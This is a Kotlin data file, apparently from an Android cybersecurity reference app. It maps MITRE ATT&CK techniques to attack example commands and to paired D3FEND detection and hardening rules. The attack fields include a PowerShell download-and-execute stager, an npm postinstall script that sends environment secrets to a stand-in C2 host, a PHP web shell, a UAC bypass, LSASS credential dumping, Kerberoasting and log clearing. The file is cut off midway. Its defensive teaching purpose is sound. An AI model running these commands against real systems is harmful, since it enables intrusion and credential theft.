package com.example.data.mitre

import androidx.compose.ui.graphics.Color
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberEmerald
import com.example.ui.theme.SeverityCritical
import com.example.ui.theme.SeverityHigh
import com.example.ui.theme.SeverityMedium

enum class MitreTactic(
    val displayName: String,
    val tacticId: String,
    val color: Color,
    val description: String
) {
    RECONNAISSANCE("Reconnaissance", "TA0043", Color(0xFF06B6D4), "Gather information to plan future adversary operations"),
    RESOURCE_DEVELOPMENT("Resource Development", "TA0042", Color(0xFF14B8A6), "Establish resources to support operations (infrastructure, accounts, tools)"),
    INITIAL_ACCESS("Initial Access", "TA0001", SeverityCritical, "Techniques used to gain an initial foothold within a network"),
    EXECUTION("Execution", "TA0002", SeverityHigh, "Techniques that result in adversary-controlled code running on a system"),
    PERSISTENCE("Persistence", "TA0003", Color(0xFFA855F7), "Maintain access across system restarts and credential changes"),
    PRIVILEGE_ESCALATION("Privilege Escalation", "TA0004", SeverityCritical, "Gain higher-level permissions (SYSTEM, root, Domain Admin)"),
    DEFENSE_EVASION("Defense Evasion", "TA0005", Color(0xFFF97316), "Avoid detection by security personnel, EDR and logging tools"),
    CREDENTIAL_ACCESS("Credential Access", "TA0006", SeverityCritical, "Steal passwords, tokens, hashes and certificates"),
    DISCOVERY("Discovery", "TA0007", CyberCyan, "Observe system configuration, network topology and environment"),
    LATERAL_MOVEMENT("Lateral Movement", "TA0008", Color(0xFFEAB308), "Access and control remote systems on the enterprise network"),
    COLLECTION("Collection", "TA0009", Color(0xFF8B5CF6), "Gather data of interest to fulfill adversary objectives"),
    COMMAND_AND_CONTROL("Command & Control", "TA0011", Color(0xFF38BDF8), "Communicate with compromised systems to control them"),
    EXFILTRATION("Exfiltration", "TA0010", Color(0xFFEC4899), "Steal data from target network to adversary storage"),
    IMPACT("Impact", "TA0040", SeverityCritical, "Disrupt availability or destroy integrity of systems and data")
}

data class MitreTtpItem(
    val techniqueId: String,
    val name: String,
    val tactic: MitreTactic,
    val subTechnique: String? = null,
    val description: String,
    val attackExampleTitle: String,
    val attackCodeCommand: String,
    val d3fendId: String,
    val d3fendName: String,
    val d3fendDescription: String,
    val d3fendRuleOrFix: String,
    val knownAptGroups: List<String>,
    val tags: List<String>
)

object MitreMatrixRepository {

    val allTtps: List<MitreTtpItem> = listOf(
        // ==================== 1. RECONNAISSANCE (TA0043) ====================
        MitreTtpItem(
            techniqueId = "T1595.002",
            name = "Active Scanning: Vulnerability Scanning",
            tactic = MitreTactic.RECONNAISSANCE,
            subTechnique = "T1595.002",
            description = "Adversaries execute automated vulnerability scans against public IP subnets and web applications to discover unpatched edge servers and exposed endpoints.",
            attackExampleTitle = "Mass Scan for Exposed Git Repositories and CVEs via Nuclei",
            attackCodeCommand = """
# Scanning perimeter IP range for exposed .git folders and Spring4Shell
nuclei -u https://target-corp.com/ -t cves/ -t exposures/ -severity critical,high
nmap -sV -sC -p 443,8443,8080 --script ssl-heartbleed,http-vuln* 198.51.100.0/24
            """.trimIndent(),
            d3fendId = "D3-NTP",
            d3fendName = "Network Traffic Pattern Analysis & Rate Limiting",
            d3fendDescription = "Deploy cloud Edge WAFs with dynamic rate limiting and behavioral bot detection to throttle and block automated scanner fingerprints.",
            d3fendRuleOrFix = """
# AWS WAF Rate-Based Rule: Block IPs making > 100 requests per 5 minutes
{
  "Name": "BlockScannerBursts",
  "Priority": 1,
  "Action": { "Block": {} },
  "Statement": {
    "RateBasedStatement": { "Limit": 100, "AggregateKeyType": "IP" }
  }
}
            """.trimIndent(),
            knownAptGroups = listOf("Volt Typhoon", "Lazarus Group", "APT41"),
            tags = listOf("Reconnaissance", "Scanning", "Nuclei", "Nmap", "WAF")
        ),
        MitreTtpItem(
            techniqueId = "T1596.001",
            name = "Search Open Technical Databases: DNS Records",
            tactic = MitreTactic.RECONNAISSANCE,
            subTechnique = "T1596.001",
            description = "Adversaries query public DNS zone records, Certificate Transparency logs, and Passive DNS caches to enumerate corporate subdomains and cloud tenants.",
            attackExampleTitle = "Subdomain Enumeration via Certificate Transparency Logs",
            attackCodeCommand = """
# Query crt.sh CT logs via curl to map all wildcard subdomains
curl -s "https://crt.sh/?q=%25.corp.internal&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
            """.trimIndent(),
            d3fendId = "D3-DRA",
            d3fendName = "DNS Request Analysis & Split-Horizon DNS",
            d3fendDescription = "Implement split-horizon DNS so internal infrastructure domain names are never published to public Certificate Transparency logs or external DNS servers.",
            d3fendRuleOrFix = """
# Cloudflare / Route53 DNSSEC & Private Zone Enforce
# Restrict non-public services exclusively to VPC Private Hosted Zones
aws route53 create-vpc-association-authorization \
  --hosted-zone-id Z12345678 --vpc VPCRegion=us-east-1,VPCId=vpc-98765432
            """.trimIndent(),
            knownAptGroups = listOf("APT29 (Nobelium)", "FIN7", "Kimsuky"),
            tags = listOf("Reconnaissance", "DNS", "Certificate Transparency", "OSINT")
        ),

        // ==================== 2. RESOURCE DEVELOPMENT (TA0042) ====================
        MitreTtpItem(
            techniqueId = "T1588.002",
            name = "Obtain Capabilities: Tool",
            tactic = MitreTactic.RESOURCE_DEVELOPMENT,
            subTechnique = "T1588.002",
            description = "Adversaries acquire offensive utility toolsets, commercial software licenses (Cobalt Strike), and open-source post-exploitation frameworks (Sliver, Mythic, Mimikatz).",
            attackExampleTitle = "Procuring and Compiling Custom Sliver C2 Binary",
            attackCodeCommand = """
# Adversary clones and compiles cross-platform C2 server
git clone https://github.com/BishopFox/sliver.git
cd sliver && make
./sliver-server --daemon
./sliver generate --http c2-domain.com --os windows --arch amd64
            """.trimIndent(),
            d3fendId = "D3-SFI",
            d3fendName = "Software Feature Invalidation & Binary Hash Deny-List",
            d3fendDescription = "Maintain enterprise Application Control (AppLocker, Windows Defender Application Control WDAC) to prevent execution of unapproved offensive binaries.",
            d3fendRuleOrFix = """
# WDAC PowerShell Policy: Block unapproved C2 binaries by hash & certificate
New-CIPolicy -Level Publisher -FilePath "C:\Rules\WDAC.xml" -UserPEs
Set-RuleOption -FilePath "C:\Rules\WDAC.xml" -Option 3 # Audit Mode / Enforce
            """.trimIndent(),
            knownAptGroups = listOf("BlackCat/ALPHV", "LockBit", "Scattered Spider"),
            tags = listOf("Resource Development", "C2", "WDAC", "AppLocker")
        ),
        MitreTtpItem(
            techniqueId = "T1584.004",
            name = "Compromise Infrastructure: Server",
            tactic = MitreTactic.RESOURCE_DEVELOPMENT,
            subTechnique = "T1584.004",
            description = "Adversaries compromise legitimate third-party web servers, VPS instances, or cloud containers to use as redirectors and operational relay nodes.",
            attackExampleTitle = "Deploying Apache mod_rewrite HTTP Reverse Proxy Redirector",
            attackCodeCommand = """
# Setup transparent C2 reverse redirector filtering non-victim IPs
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} ^Mozilla.* [NC]
RewriteRule ^/beacon$ http://actual-c2-backend.internal:8080/beacon [P]
RewriteRule ^.*$ https://legitimate-decoy-site.com/ [R=302,L]
            """.trimIndent(),
            d3fendId = "D3-TI",
            d3fendName = "Threat Intelligence Verification & IP Reputation Feeds",
            d3fendDescription = "Continuously cross-reference outbound edge firewall sessions with high-frequency threat intelligence feeds and newly registered domain (NRD) lists.",
            d3fendRuleOrFix = """
# Palo Alto EDL (External Dynamic List) configuration:
# Block outbound web traffic to domains registered < 30 days ago
Set deviceconfig system external-list "Newly-Registered-Domains" url "https://edl.intel.org/nrd"
            """.trimIndent(),
            knownAptGroups = listOf("APT28 (Fancy Bear)", "Turla", "MuddyWater"),
            tags = listOf("Resource Development", "Redirector", "C2", "Proxy")
        ),

        // ==================== 3. INITIAL ACCESS (TA0001) ====================
        MitreTtpItem(
            techniqueId = "T1190",
            name = "Exploit Public-Facing Application",
            tactic = MitreTactic.INITIAL_ACCESS,
            description = "Adversaries take advantage of a vulnerability, bug, or design flaw in internet-exposed software, servers, or APIs to execute remote code.",
            attackExampleTitle = "Exploiting Unauthenticated RCE on Exposed Edge Gateway",
            attackCodeCommand = """
# Send crafted HTTP POST payload exploiting buffer overflow in SSL-VPN gateway
curl -k -X POST https://target-vpn.corp.com/api/v1/cav/client/status \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user=admin&session=${'$'}(python3 -c 'print("A"*4096)')"
            """.trimIndent(),
            d3fendId = "D3-ITF",
            d3fendName = "Inbound Traffic Filtering & WAF",
            d3fendDescription = "Inspect inbound packet streams and HTTP payload headers against signature patterns and anomaly thresholds before reaching application processes.",
            d3fendRuleOrFix = """
# ModSecurity WAF rule to drop malformed buffer overflow payloads
SecRule REQUEST_URI "@contains /api/v1/cav/" \
  "id:200001,phase:2,deny,status:403,log,msg:'Potential T1190 Gateway Exploit Dropped'"
            """.trimIndent(),
            knownAptGroups = listOf("Volt Typhoon", "LockBit", "APT29"),
            tags = listOf("Initial Access", "Zero-Day", "WAF", "Perimeter")
        ),
        MitreTtpItem(
            techniqueId = "T1566.001",
            name = "Spearphishing Attachment",
            tactic = MitreTactic.INITIAL_ACCESS,
            subTechnique = "T1566.001",
            description = "Adversaries send spearphishing emails with malicious file attachments (macros, ISO images, weaponized PDFs) to gain execution inside the enterprise network.",
            attackExampleTitle = "Macro-Enabled Office Document Delivering Stager",
            attackCodeCommand = """
# Weaponized LNK payload inside ISO file masquerading as invoice
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc \
  JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA
            """.trimIndent(),
            d3fendId = "D3-MAA",
            d3fendName = "Message Authentication & Attachment Sandboxing",
            d3fendDescription = "Validate SPF/DKIM/DMARC headers and execute untrusted inbound attachments in air-gapped detonator sandboxes.",
            d3fendRuleOrFix = """
# Microsoft Defender Attack Surface Reduction (ASR) rule GUID
# Block Office applications from creating child processes
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A \
  -AttackSurfaceReductionRules_Actions Enabled
            """.trimIndent(),
            knownAptGroups = listOf("FIN7", "Scattered Spider", "Lazarus Group"),
            tags = listOf("Phishing", "Email Security", "ASR Rules", "Initial Access")
        ),
        MitreTtpItem(
            techniqueId = "T1195.002",
            name = "Compromise Software Supply Chain",
            tactic = MitreTactic.INITIAL_ACCESS,
            subTechnique = "T1195.002",
            description = "Adversaries manipulate application dependencies, npm/PyPI packages, or build pipeline tools to distribute malicious code downstream to unsuspecting consumers.",
            attackExampleTitle = "Typosquatting Malicious npm Package Exfiltrating AWS Keys",
            attackCodeCommand = """
// Malicious postinstall script inside published dependency
const https = require('https');
const env = JSON.stringify(process.env);
https.request({ hostname: 'c2.malicious-intel.org', path: '/exfil', method: 'POST' })
  .end(Buffer.from(env).toString('base64'));
            """.trimIndent(),
            d3fendId = "D3-SDV",
            d3fendName = "Software Dependency Verification & SBOM Auditing",
            d3fendDescription = "Verify cryptographic provenance, enforce package integrity checksums, and disallow automatic script execution on build machines.",
            d3fendRuleOrFix = """
# Enforce safe npm installation in CI/CD pipeline
echo "ignore-scripts=true" >> .npmrc
npm audit --audit-level=high
cosign verify-attestation --key cosign.pub dist/app.tar.gz
            """.trimIndent(),
            knownAptGroups = listOf("APT29 (Nobelium)", "Lazarus"),
            tags = listOf("Supply Chain", "DevSecOps", "npm", "SLSA")
        ),

        // ==================== 4. EXECUTION (TA0002) ====================
        MitreTtpItem(
            techniqueId = "T1059.001",
            name = "Command and Scripting Interpreter: PowerShell",
            tactic = MitreTactic.EXECUTION,
            subTechnique = "T1059.001",
            description = "Adversaries abuse the PowerShell command-line interpreter to execute arbitrary commands, download payloads into memory, and interface with Windows APIs.",
            attackExampleTitle = "In-Memory Shellcode Stager Execution",
            attackCodeCommand = """
powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://c2.telemetry-host.com/stager.ps1')"
            """.trimIndent(),
            d3fendId = "D3-SEA",
            d3fendName = "Script Execution Analysis & Constrained Language",
            d3fendDescription = "Enable Script Block Logging (EID 4104), PowerShell Constrained Language Mode, and Anti-Malware Scan Interface (AMSI).",
            d3fendRuleOrFix = """
// Microsoft Sentinel KQL Hunting Rule for DownloadString execution
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("DownloadString", "IEX", "Invoke-Expression", "-EncodedCommand")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
            """.trimIndent(),
            knownAptGroups = listOf("BlackCat", "DarkGate", "APT33"),
            tags = listOf("Execution", "PowerShell", "KQL", "AMSI")
        ),
        MitreTtpItem(
            techniqueId = "T1053.005",
            name = "Scheduled Task Execution",
            tactic = MitreTactic.EXECUTION,
            subTechnique = "T1053.005",
            description = "Adversaries abuse task scheduling utilities (schtasks, cron) to facilitate ongoing execution and establish operational persistence.",
            attackExampleTitle = "Creating Hidden SYSTEM Scheduled Task via schtasks",
            attackCodeCommand = """
schtasks /create /tn "WindowsTelemetryUpdate" /tr "cmd.exe /c C:\Users\Public\svchost.exe" /sc onlogon /ru "SYSTEM"
            """.trimIndent(),
            d3fendId = "D3-JEA",
            d3fendName = "Job Execution Analysis & Task Audit",
            d3fendDescription = "Monitor Windows Security Event ID 4698 (A scheduled task was created) and baseline legitimate task registration paths.",
            d3fendRuleOrFix = """
# Audit newly registered scheduled tasks
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698} |
  Where-Object { ${'$'}_.Message -match 'C:\\Users\\Public' -or ${'$'}_.Message -match 'powershell' }
            """.trimIndent(),
            knownAptGroups = listOf("Akira", "BlackSuit", "APT28"),
            tags = listOf("Execution", "Persistence", "Scheduled Tasks")
        ),

        // ==================== 5. PERSISTENCE (TA0003) ====================
        MitreTtpItem(
            techniqueId = "T1505.003",
            name = "Server Software Component: Web Shell",
            tactic = MitreTactic.PERSISTENCE,
            subTechnique = "T1505.003",
            description = "Adversaries deploy web shells to vulnerable web application servers to maintain persistent backdoors and execute OS commands via HTTP requests.",
            attackExampleTitle = "Uploading Obfuscated JSP/PHP Web Shell",
            attackCodeCommand = """
# Malicious PHP web shell taking commands via encoded HTTP headers
<?php if(isset(${'$'}_SERVER['HTTP_X_CMD'])){ system(base64_decode(${'$'}_SERVER['HTTP_X_CMD'])); } ?>
            """.trimIndent(),
            d3fendId = "D3-FIM",
            d3fendName = "File Integrity Monitoring (FIM)",
            d3fendDescription = "Continuously verify cryptographic file hashes on web server root folders and disallow write access for web runtime service accounts.",
            d3fendRuleOrFix = """
# Linux Inotifywait rule auditing newly created .php or .jsp files in webroot
inotifywait -m -r -e create,modify --format '%w%f' /var/www/html | while read FILE; do
  echo "ALERT: Unverified file modified in webroot: ${'$'}FILE"
done
            """.trimIndent(),
            knownAptGroups = listOf("HAFNIUM", "Volt Typhoon", "MuddyWater"),
            tags = listOf("Persistence", "Web Shell", "FIM", "AppSec")
        ),
        MitreTtpItem(
            techniqueId = "T1547.001",
            name = "Boot or Logon Autostart: Registry Run Keys",
            tactic = MitreTactic.PERSISTENCE,
            subTechnique = "T1547.001",
            description = "Adversaries add entries to Run and RunOnce registry keys to achieve persistence whenever a user or administrator logs onto Windows.",
            attackExampleTitle = "Writing Malicious Stager to HKCU Software Microsoft Windows CurrentVersion Run",
            attackCodeCommand = """
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsSecurityHealth" /t REG_SZ /d "C:\Users\Public\stager.exe" /f
            """.trimIndent(),
            d3fendId = "D3-RA",
            d3fendName = "Registry Analysis & Autorun Auditing",
            d3fendDescription = "Continuously audit modifications to standard Run, RunOnce, and Winlogon registry keys using Sysmon Event ID 13.",
            d3fendRuleOrFix = """
// Sysmon Event ID 13: Registry value set
DeviceRegistryEvents
| where ActionType =~ "RegistryValueSet"
| where RegistryKey has_any ("\\CurrentVersion\\Run", "\\CurrentVersion\\RunOnce")
| project Timestamp, DeviceName, InitiatingProcessFileName, RegistryKey, RegistryValueData
            """.trimIndent(),
            knownAptGroups = listOf("APT41", "FIN8", "Turla"),
            tags = listOf("Persistence", "Registry", "Sysmon", "Autorun")
        ),

        // ==================== 6. PRIVILEGE ESCALATION (TA0004) ====================
        MitreTtpItem(
            techniqueId = "T1611",
            name = "Escape to Host (Container Breakout)",
            tactic = MitreTactic.PRIVILEGE_ESCALATION,
            description = "Adversaries break out of a container runtime environment (Docker, Kubernetes) to gain root code execution on the underlying physical or virtual host node.",
            attackExampleTitle = "Mounted Docker Socket Exploitation for Host Escape",
            attackCodeCommand = """
# Inside compromised container with mounted /var/run/docker.sock:
docker run -v /:/host -it alpine chroot /host /bin/sh
# You now have root shell on the underlying Kubernetes host node!
            """.trimIndent(),
            d3fendId = "D3-CI",
            d3fendName = "Container Isolation & Seccomp Hardening",
            d3fendDescription = "Enforce Kubernetes Admission Controllers disallowing hostPath volume mounts and banning container access to the host Docker daemon socket.",
            d3fendRuleOrFix = """
# Kyverno policy rejecting docker.sock mounts in pods
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-docker-sock-mount
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-hostpath-socket
    match:
      resources: { kinds: ["Pod"] }
    validate:
      message: "Mounting docker.sock is strictly forbidden."
      pattern:
        spec:
          =(volumes):
          - =(hostPath):
              path: "!*docker.sock"
            """.trimIndent(),
            knownAptGroups = listOf("TeamTNT", "Kinsing", "RedCurl"),
            tags = listOf("Privilege Escalation", "Kubernetes", "Docker", "DevSecOps")
        ),
        MitreTtpItem(
            techniqueId = "T1548.002",
            name = "Abuse Elevation Control Mechanism: Bypass UAC",
            tactic = MitreTactic.PRIVILEGE_ESCALATION,
            subTechnique = "T1548.002",
            description = "Adversaries bypass Windows User Account Control (UAC) to execute malicious code with high or elevated administrative privileges without displaying an elevation prompt.",
            attackExampleTitle = "Bypassing UAC via Fodhelper Registry Hijack",
            attackCodeCommand = """
# Hijack ms-settings protocol handler for fodhelper auto-elevation
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Users\Public\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
C:\Windows\System32\fodhelper.exe
            """.trimIndent(),
            d3fendId = "D3-PAC",
            d3fendName = "Process Access Control & UAC Mandatory High Policy",
            d3fendDescription = "Configure Windows UAC to 'Always Notify' and block standard users from writing to user registry classes queried by auto-elevating binaries.",
            d3fendRuleOrFix = """
# Enforce Maximum UAC Slider Level via GPO/Registry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" \
  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 2 /f
            """.trimIndent(),
            knownAptGroups = listOf("Wizard Spider", "FIN7", "APT33"),
            tags = listOf("Privilege Escalation", "UAC Bypass", "Fodhelper", "GPO")
        ),

        // ==================== 7. DEFENSE EVASION (TA0005) ====================
        MitreTtpItem(
            techniqueId = "T1055.001",
            name = "Process Injection: Dynamic-link Library Injection",
            tactic = MitreTactic.DEFENSE_EVASION,
            subTechnique = "T1055.001",
            description = "Adversaries inject malicious dynamic-link libraries (DLLs) into valid system processes (e.g. explorer.exe, spoolsv.exe) to evade endpoint detection.",
            attackExampleTitle = "Process Injection via CreateRemoteThread",
            attackCodeCommand = """
// Classic DLL injection logic
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuf, dllPath, strlen(dllPath), NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteBuf, 0, NULL);
            """.trimIndent(),
            d3fendId = "D3-PID",
            d3fendName = "Process Injection Detection & Memory Protection",
            d3fendDescription = "Inspect cross-process VirtualAllocEx calls and monitor Sysmon Event ID 8 (CreateRemoteThread) directed toward critical OS processes.",
            d3fendRuleOrFix = """
# Sysmon configuration rule detecting remote thread creation in explorer.exe
<RuleGroup name="Detect-CreateRemoteThread" groupRelation="or">
  <CreateRemoteThread onmatch="include">
    <TargetImage condition="end with">explorer.exe</TargetImage>
    <TargetImage condition="end with">spoolsv.exe</TargetImage>
  </CreateRemoteThread>
</RuleGroup>
            """.trimIndent(),
            knownAptGroups = listOf("APT41", "FIN8", "Turla"),
            tags = listOf("Defense Evasion", "Process Injection", "Sysmon")
        ),
        MitreTtpItem(
            techniqueId = "T1562.001",
            name = "Impair Defenses: Disable or Modify Tools",
            tactic = MitreTactic.DEFENSE_EVASION,
            subTechnique = "T1562.001",
            description = "Adversaries disable security software, terminate EDR sensor services, unload kernel filter drivers, or clear security logs prior to executing ransomware.",
            attackExampleTitle = "Stopping Security Services and Clearing Event Logs",
            attackCodeCommand = """
# Stop defender and clear system/security audit logs
sc.exe stop WinDefend
wevtutil.exe cl Security
wevtutil.exe cl System
            """.trimIndent(),
            d3fendId = "D3-ETP",
            d3fendName = "EDR Tamper Protection & Immutable Logging",
            d3fendDescription = "Enable hardware-enforced tamper protection and stream logs off-box in real-time to remote SIEM sinks so local clearing fails to blind investigators.",
            d3fendRuleOrFix = """
// Sigma Rule: Security Event Log Cleared
title: Security Event Log Cleared
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wevtutil.exe'
        CommandLine|contains:
            - ' cl '
            - 'clear-log'
    condition: selection
level: critical
            """.trimIndent(),
            knownAptGroups = listOf("LockBit", "BlackCat", "Qakbot"),
            tags = listOf("Defense Evasion", "Tamper Protection", "Sigma", "Ransomware")
        ),

        // ==================== 8. CREDENTIAL ACCESS (TA0006) ====================
        MitreTtpItem(
            techniqueId = "T1003.001",
            name = "OS Credential Dumping: LSASS Memory",
            tactic = MitreTactic.CREDENTIAL_ACCESS,
            subTechnique = "T1003.001",
            description = "Adversaries extract plain-text passwords, NTLM password hashes, and Kerberos tickets directly from the Local Security Authority Subsystem Service (LSASS) process memory.",
            attackExampleTitle = "Dumping LSASS Memory with MiniDump / ProcDump",
            attackCodeCommand = """
# Memory dump of lsass.exe via Sysinternals ProcDump
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp

# Extract credentials offline with Mimikatz
sekurlsa::minidump lsass_dump.dmp
sekurlsa::logonpasswords
            """.trimIndent(),
            d3fendId = "D3-LAR",
            d3fendName = "LSASS Access Restriction & Credential Guard",
            d3fendDescription = "Enable Windows Defender Credential Guard using virtualization-based security (VBS) so LSASS secrets are isolated inside a secure microkernel.",
            d3fendRuleOrFix = """
# Enable LSA Protection via Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPLBoot" /t REG_DWORD /d 2 /f
            """.trimIndent(),
            knownAptGroups = listOf("Wizard Spider", "Scattered Spider", "APT29"),
            tags = listOf("Credential Access", "LSASS", "Credential Guard", "Mimikatz")
        ),
        MitreTtpItem(
            techniqueId = "T1558.003",
            name = "Steal or Forge Kerberos Tickets: Kerberoasting",
            tactic = MitreTactic.CREDENTIAL_ACCESS,
            subTechnique = "T1558.003",
            description = "Adversaries abuse Kerberos TGS requests for service accounts associated with SPNs to crack password hashes offline without triggering account lockouts.",
            attackExampleTitle = "Harvesting and Cracking Kerberos Service Tickets",
            attackCodeCommand = """
# Request Service Principal Names and export TGS ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.corp.local:1433"
# Export ticket cache with Mimikatz / Rubeus
Rubeus.exe kerberoast /outfile:kerb_hashes.txt
            """.trimIndent(),
            d3fendId = "D3-KTV",
            d3fendName = "Kerberos Ticket Verification & gMSA",
            d3fendDescription = "Migrate service accounts to Group Managed Service Accounts (gMSA) with 120-character randomized keys that cannot be cracked offline.",
            d3fendRuleOrFix = """
# Check Active Directory for weak user accounts acting as SPNs
Get-ADUser -Filter {ServicePrincipalNames -like "*"} -Properties ServicePrincipalNames |
  Select-Object Name, ServicePrincipalNames, PasswordLastSet
            """.trimIndent(),
            knownAptGroups = listOf("FIN7", "APT32", "Vice Society"),
            tags = listOf("Credential Access", "Active Directory", "Kerberoast", "gMSA")
        ),

        // ==================== 9. DISCOVERY (TA0007) ====================
        MitreTtpItem(
            techniqueId = "T1087.002",
            name = "Account Discovery: Domain Account",
            tactic = MitreTactic.DISCOVERY,
            subTechnique = "T1087.002",
            description = "Adversaries query Active Directory Domain Controllers to enumerate user accounts, group memberships, and administrative privileges.",
            attackExampleTitle = "BloodHound / SharpHound Domain Enumeration",
            attackCodeCommand = """
# Run SharpHound collector to discover attack paths to Domain Admin
SharpHound.exe -c All,LoggedOn,ObjectProps --outputdirectory C:\Users\Public\
net group "Domain Admins" /domain
            """.trimIndent(),
            d3fendId = "D3-ADDA",
            d3fendName = "Active Directory Query Anomaly Detection",
            d3fendDescription = "Monitor LDAP query volume spikes (Event ID 1644) and deploy Honeytoken accounts to detect unauthorized domain reconnaissance.",
            d3fendRuleOrFix = """
# Snort / Zeek signature for excessive LDAP search filter enumeration
alert tcp ${'$'}HOME_NET any -> ${'$'}DC_SERVERS 389 (msg:"Excessive LDAP Search Filter BloodHound"; \
  content:"(|(objectClass=user)(objectClass=group))"; sid:1000045; rev:1;)
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "Conti", "LockBit"),
            tags = listOf("Discovery", "Active Directory", "BloodHound", "LDAP")
        ),
        MitreTtpItem(
            techniqueId = "T1018",
            name = "Remote System Discovery",
            tactic = MitreTactic.DISCOVERY,
            description = "Adversaries discover other systems, IP addresses, and hostnames on the network to prepare for lateral movement.",
            attackExampleTitle = "ARP and NetBIOS Internal Subnet Discovery",
            attackCodeCommand = """
# Discover live hosts without noisy port scanning
arp -a
nltest /dclist:corp.local
Test-NetConnection -ComputerName 10.10.10.25 -Port 445
            """.trimIndent(),
            d3fendId = "D3-NSS",
            d3fendName = "Network Microsegmentation & Host Isolation",
            d3fendDescription = "Restrict endpoint-to-endpoint network communication so workstations cannot discover or connect to peer workstations.",
            d3fendRuleOrFix = """
# Windows Firewall rule: Block local subnet traffic on workstation profiles
New-NetFirewallRule -DisplayName "Zero-Trust Peer Isolation" \
  -Direction Inbound -RemoteAddress LocalSubnet -Action Block -Profile Domain
            """.trimIndent(),
            knownAptGroups = listOf("Akira", "BlackSuit", "Lazarus"),
            tags = listOf("Discovery", "Network", "ARP", "Zero-Trust")
        ),

        // ==================== 10. LATERAL MOVEMENT (TA0008) ====================
        MitreTtpItem(
            techniqueId = "T1021.002",
            name = "Remote Services: SMB/Windows Admin Shares",
            tactic = MitreTactic.LATERAL_MOVEMENT,
            subTechnique = "T1021.002",
            description = "Adversaries move laterally across corporate networks by connecting to hidden admin shares (C$, ADMIN$, IPC$) using stolen credentials or NTLM hashes.",
            attackExampleTitle = "Remote Execution via PsExec / Impacket",
            attackCodeCommand = """
# Remote command execution over SMB using Impacket psexec
psexec.py corp.local/admin:P@ssword@10.10.10.25 "whoami && net localgroup administrators"
            """.trimIndent(),
            d3fendId = "D3-NSM",
            d3fendName = "Network Micro-segmentation & SMB Signing",
            d3fendDescription = "Block workstation-to-workstation SMB (port 445) traffic using host firewalls and mandate SMBv3 cryptographic signing.",
            d3fendRuleOrFix = """
# Disable inbound port 445 SMB between peer client workstations
New-NetFirewallRule -DisplayName "Block Workstation-to-Workstation SMB" \
  -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block -Profile Domain
            """.trimIndent(),
            knownAptGroups = listOf("LockBit", "Conti", "APT38"),
            tags = listOf("Lateral Movement", "SMB", "Microsegmentation", "Impacket")
        ),
        MitreTtpItem(
            techniqueId = "T1021.001",
            name = "Remote Services: Remote Desktop Protocol (RDP)",
            tactic = MitreTactic.LATERAL_MOVEMENT,
            subTechnique = "T1021.001",
            description = "Adversaries log into remote systems over RDP using compromised credentials to interactively control server environments.",
            attackExampleTitle = "Establishing Interactive RDP Session with Stolen Credentials",
            attackCodeCommand = """
# Tunneling and launching RDP session via xfreerdp
xfreerdp /v:10.10.10.50 /u:DomainAdmin /p:'Summer2025!' /cert:ignore /dynamic-resolution
            """.trimIndent(),
            d3fendId = "D3-MFA",
            d3fendName = "Multi-Factor Authentication for RDP & NLA",
            d3fendDescription = "Mandate Network Level Authentication (NLA) and hardware token MFA on all internal RDP sessions.",
            d3fendRuleOrFix = """
# Enforce Network Level Authentication (NLA) via Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" \
  /v "UserAuthentication" /t REG_DWORD /d 1 /f
            """.trimIndent(),
            knownAptGroups = listOf("FIN7", "DarkSide", "Scattered Spider"),
            tags = listOf("Lateral Movement", "RDP", "MFA", "NLA")
        ),

        // ==================== 11. COLLECTION (TA0009) ====================
        MitreTtpItem(
            techniqueId = "T1114.002",
            name = "Email Collection: Remote Email Collection",
            tactic = MitreTactic.COLLECTION,
            subTechnique = "T1114.002",
            description = "Adversaries access and exfiltrate user emails from Microsoft 365 Exchange Online or Google Workspace via compromised OAuth app tokens.",
            attackExampleTitle = "Harvesting Inboxes via Malicious Azure OAuth Application",
            attackCodeCommand = """
# Querying Microsoft Graph API for all C-suite emails with stolen bearer token
curl -X GET "https://graph.microsoft.com/v1.0/users/ceo@corp.com/messages" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLC..."
            """.trimIndent(),
            d3fendId = "D3-UAC",
            d3fendName = "User Application Consent Restriction & OAuth Auditing",
